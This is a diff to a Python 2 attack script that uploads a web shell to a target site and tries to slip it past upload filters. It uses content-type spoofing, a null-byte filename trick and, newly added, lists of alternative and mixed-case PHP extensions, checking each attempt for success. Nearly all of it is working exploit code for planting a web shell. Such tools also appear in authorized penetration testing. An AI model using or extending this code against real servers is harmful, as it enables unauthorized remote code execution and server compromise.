@@ -10,12 +10,14 @@ import os
 import mimetypes
 import argparse
 import sys
-from shutil import copyfile
+#from shutil import copyfile
 
 """Global variables"""
 mimetypes.init()
 files_folder = 'files/'
 extra_mime_types = {'php': 'text/x-php'}
+exec_extensions = ['.php1', '.php2', '.php3', '.php4', '.php5', '.phtml']
+case_extensions = ['.PhP', '.Php1', '.PhP2', '.pHP3', '.pHp4', '.PHp5', 'PhtMl']
 
 
 def banner():
@@ -93,14 +95,10 @@ def bypass_content_type(url, shell_location, mime_type, upload_parameter, upload
     print ''
 
 
-def bypass_nullbyte(url, shell_location, mime_type, accepted_filetypes, upload_parameter, upload_dir):
+def bypass_nullbyte(url, shell_location, mime_type, accepted_filetype, upload_parameter, upload_dir):
 
     shell_filename = os.path.basename(shell_location)
-    #nullbyte_file_location = files_folder + shell_file + '%00.' + accepted_filetypes
-    #copyfile(shell_location, nullbyte_file_location)
-
-    nullbyte_filename = shell_filename + '%00' + accepted_filetypes
-
+    nullbyte_filename = shell_filename + '%00' + accepted_filetype
 
     print 'Null Byte Bypass'
 
@@ -118,22 +116,45 @@ def bypass_nullbyte(url, shell_location, mime_type, accepted_filetypes, upload_p
     print ''
 
 
+def bypass_exec_extensions(url, shell_location, mime_type, upload_parameter, upload_dir):
+    shell_filename = os.path.splitext(os.path.basename(shell_location))[0]
+    for extension in exec_extensions:
+        shell_exec_filename = ''.join([shell_filename, extension])
+        file_upload(url, shell_location, shell_exec_filename, mime_type, upload_parameter)
+        if file_check(upload_dir, shell_exec_filename):
+            print 'Win'
+        else:
+            print 'Fail'
 
-def run_me(url, shell, upload_dir, accepted_filetypes, upload_parameter):
+
+def bypass_case_extensions(url, shell_location, mime_type, upload_parameter, upload_dir):
+    shell_filename = os.path.splitext(os.path.basename(shell_location))[0]
+    for extension in case_extensions:
+        shell_exec_filename = ''.join([shell_filename, extension])
+        file_upload(url, shell_location, shell_exec_filename, mime_type, upload_parameter)
+        if file_check(upload_dir, shell_exec_filename):
+            print 'Win'
+        else:
+            print 'Fail'
+
+
+def run_me(url, shell, upload_dir, accepted_filetype, upload_parameter):
     """
     Run some of the modules
     """
     try:
-        mime_type = mimetypes.types_map[''.join(['.', accepted_filetypes])]
+        mime_type = mimetypes.types_map[''.join(['.', accepted_filetype])]
     except:
-        if accepted_filetypes in extra_mime_types:
-            mime_type = extra_mime_types[accepted_filetypes]
+        if accepted_filetype in extra_mime_types:
+            mime_type = extra_mime_types[accepted_filetype]
         else:
-            sys.exit('Unable to find mime type of %s. Please add it to extra_mime_types' %accepted_filetypes)
+            sys.exit('Unable to find mime type of %s. Please add it to extra_mime_types' % accepted_filetype)
 
     upload_shell(url, shell, upload_parameter, upload_dir)
     bypass_content_type(url, shell, mime_type, upload_parameter, upload_dir)
-    bypass_nullbyte(url, shell, mime_type, accepted_filetypes, upload_parameter, upload_dir)
+    bypass_nullbyte(url, shell, mime_type, accepted_filetype, upload_parameter, upload_dir)
+    bypass_exec_extensions(url, shell, mime_type, upload_parameter, upload_dir)
+    bypass_case_extensions(url, shell, mime_type, upload_parameter, upload_dir)
 
 
 if __name__ == "__main__":
@@ -159,7 +180,7 @@ if __name__ == "__main__":
     parser.add_argument(
         '-f',
         action='store',
-        dest='accepted_filetypes',
+        dest='accepted_filetype',
         help='The file types accepted by the uploader e.g. jpg,png,pdf',
         required=True)
     parser.add_argument(
@@ -173,4 +194,4 @@ if __name__ == "__main__":
     if not os.path.isfile(results.shell):
         sys.exit("%s not found" % results.shell)
     banner()
-    run_me(results.url, results.shell, results.upload_dir, results.accepted_filetypes, results.upload_paramater)
+    run_me(results.url, results.shell, results.upload_dir, results.accepted_filetype, results.upload_paramater)
